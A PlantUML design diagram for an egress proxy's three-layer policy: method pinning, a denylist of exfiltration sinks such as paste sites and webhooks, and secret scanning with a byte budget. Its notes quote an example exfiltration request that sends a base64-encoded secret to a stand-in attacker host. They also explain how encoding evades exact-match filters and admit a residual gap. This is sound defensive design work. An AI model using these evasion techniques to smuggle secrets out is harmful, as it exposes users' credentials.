@startuml EgressPolicyLayers
' SPEC source: internal/egresspolicy/policy.go, internal/egresspolicy/defaults.go
!includeurl https://raw.githubusercontent.com/proveo-ca/identity/refs/heads/main/proveo.iuml
skinparam componentStyle rectangle
skinparam shadowing false
skinparam packageStyle rectangle

title Egress Policy — three layers (A / B / C)

package "Layer A · Method pin" as A {
  component "GET HEAD OPTIONS\n→ allow any non-denied host\n(doc scraping)" as Read <<app>>
  component "POST PUT PATCH DELETE\n→ write-allowlist only\n(providers + github… +\nPROVEO_EGRESS_*)" as Write <<app>>
}

package "Layer B · Exfil-sink denylist" as B {
  component "paste / webhook / tunnel\nchat-webhook / doh / shortener" as Sinks <<app>>
  component "all methods blocked\neven GET webhook.site" as SinkRule <<app>>
}

package "Layer C · DLP + volume" as C {
  component "known provider secrets\n+ shape heuristics\n+ high entropy tokens" as Secrets <<app>>
  component "outbound byte budget\nper non-allowlisted host\n(default 8k / run)" as Budget <<app>>
}

package "Config (defaults + override)" as Cfg {
  component "embedded default policy" as Def <<config>>
  component "--egress-policy file\nPROVEO_EGRESS_POLICY" as Override <<config>>
}

Def ..> A
Def ..> B
Def ..> C
Override ..> A
Override ..> B
Override ..> C

note bottom of A
Intended Squid ""unsafe_methods"" behavior,
enforced where the method is visible (MITM).
end note

note bottom of B
Curated starter list in defaults; refreshable.
Optional future layer D: reputation / freshness.
end note

note bottom of C
Scans URL path+query and body. Blocks (default)
or redacts. Closes ""GET ?key=secret"" that A misses.

**Two detectors, deliberately asymmetric.** //Decode-and-rescan//
(""DecodeScan"", default ON) is the primary encoding-evasion defense:
base64/hex runs in the URL or body are decoded one level and re-checked
against the exact-value and credential-shape matchers. It fires only on
a token that decodes to an //actual// secret, so it costs almost no false
positives. //Entropy// (""BlockEntropy"", default OFF) is the opt-in
backstop that also catches an encoded UNKNOWN blob, at the price of
false-positives on legitimately high-entropy URLs — presigned links,
JWTs. See F1/F2 in ""_spec/_conventions/design-decision-ids\.puml"" for
the finding these answer.

**Why exact-match alone was not enough.** Before decode-and-rescan the
only content gates were exact values and shape regexes, which base64
defeats trivially, and a budget that ignored the URL path — so
""GET https://attacker/<base64(secret)>"" left unbounded. The budget now
charges the **whole request-target, path AND query, plus body**, so data
smuggled in a path is bounded like any other exfil.

**Residual, stated rather than hidden:** with both detectors off, an
encoded unknown blob is bounded only by the byte budget. Decode-scan
closes the known-secret case cheaply; entropy is what covers unknown
blobs, and it is off by default on purpose.

**Decoding is bounded too.** Candidate runs carry minimum lengths so
every short word is not decoded (base64 of an 8-byte secret is ~11–12
chars, hex is 2× the bytes), runs are extracted per-encoding so URL
delimiters do not glue two tokens into one unparseable run, and a
decoding that is too short or clearly binary is dropped unscanned — a
benign random signature decodes to non-text bytes and must not become a
false positive.

**Body scanning is memory-bounded, and the sidecar's memory limit
follows from it.** At most ""maxBodyScan"" (~1 MiB) is read for the scan
and an equivalent body is reattached that streams the untouched
remainder, so proxy memory stays flat regardless of upload size. That
bound is why the egress-proxy container's cap can be small; raise one
and the other has to move with it.

**Headers are scanned as well as stripped.** The broker strips a fixed
set of header //names// off-provider; the scan catches a secret smuggled
in any other header, which is also what covers the multi-provider case
where a second provider's key rides a header the strip list never named.
end note

@enduml
